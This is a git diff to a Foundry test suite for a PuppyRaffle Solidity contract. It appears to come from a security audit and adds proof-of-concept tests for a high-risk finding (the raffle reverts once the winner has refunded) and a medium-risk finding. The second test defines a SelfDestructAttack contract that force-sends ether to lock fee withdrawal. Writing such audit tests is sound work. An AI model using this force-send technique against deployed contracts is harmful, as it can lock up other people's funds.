@@ -231,7 +231,7 @@ contract PuppyRaffleTest is Test {
     }
 
     //////////////////////
-    /// withdrawFees         ///
+    /// WithdrawFees   ///
     /////////////////////
     function testCantWithdrawFeesIfPlayersActive() public playersEntered {
         vm.expectRevert("PuppyRaffle: There are currently players active!");
@@ -303,4 +303,63 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.tokenURI(0);
     }
 
+    ////////////////////////////
+    ///  High Risk Findings  ///
+    ////////////////////////////
+
+    function testSelectWinnerAlwaysRevertsIfWinnerHasRefunded() public playersEntered {
+        // if winner has refunded, prize pool will be sent to address(0) which reverts
+        // other participants can still refund their enterance fee
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerFour);
+        vm.prank(playerFour);
+        puppyRaffle.refund(indexOfPlayer);
+        
+        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
+        puppyRaffle.selectWinner();
+
+        vm.deal(address(puppyRaffle), 10 ether);
+        vm.expectRevert("ERC721: mint to the zero address");
+        puppyRaffle.selectWinner();
+
+        uint256 balanceBefore = address(playerOne).balance;
+        indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+
+        vm.prank(playerOne);
+        puppyRaffle.refund(indexOfPlayer);
+
+        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
+    }
+
+
+    ////////////////////////////
+    /// Medium Risk Findings ///
+    ////////////////////////////
+
+    function testSendingFundsToContractBricksWithdrawFees() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        SelfDestructAttack selfDestruct = new SelfDestructAttack(puppyRaffle);
+        vm.deal(address(selfDestruct), 1 ether);
+        selfDestruct.attack();
+
+        puppyRaffle.selectWinner();
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+}
+
+contract SelfDestructAttack {
+    PuppyRaffle puppyRaffle;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+    }
+
+    function attack() public payable {
+        selfdestruct(payable(address(puppyRaffle)));
+    }
 }
